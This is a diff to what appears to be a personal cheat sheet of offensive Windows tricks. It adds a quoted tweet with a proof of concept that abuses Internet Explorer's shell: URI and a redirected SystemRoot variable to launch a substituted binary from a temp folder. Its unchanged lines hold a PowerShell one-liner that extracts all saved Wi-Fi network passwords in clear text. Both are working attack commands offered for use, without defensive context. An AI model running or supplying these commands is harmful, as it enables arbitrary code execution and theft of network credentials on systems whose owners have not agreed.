@@ -1,4 +1,22 @@
 *************************
+¬ whickey
+@notwhickey
+Have you ever considered Internet Explorer to be a #lolbin? 
+By navigating to URI: `shell:::{3f6bc534-dfa1-4ab4-ae54-ef25a74e0107}` you can spawn `rstrui.exe` (System Restore). 
+If you modify the `SystemRoot` environment variable and copy over DLLs you can run whatever you like.
+
+POC: 
+mkdir %temp%\System32
+FOR /R C:\Windows\System32\ %F IN (*.dll) DO COPY "%F" %temp%\System32\ /Y >NUL
+set a=C:\Windows\System32\calc.exe
+copy %a% %temp%\System32\rstrui.exe /Y > NUL
+set SystemRoot=%temp%
+start iexplore shell:::{3f6bc534-dfa1-4ab4-ae54-ef25a74e0107}
+1:09 AM · Oct 25, 2022
+
+
+
+*************************
 powershell to grab all the known WAPs and passwords:
 
  (netsh wlan show profile) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize
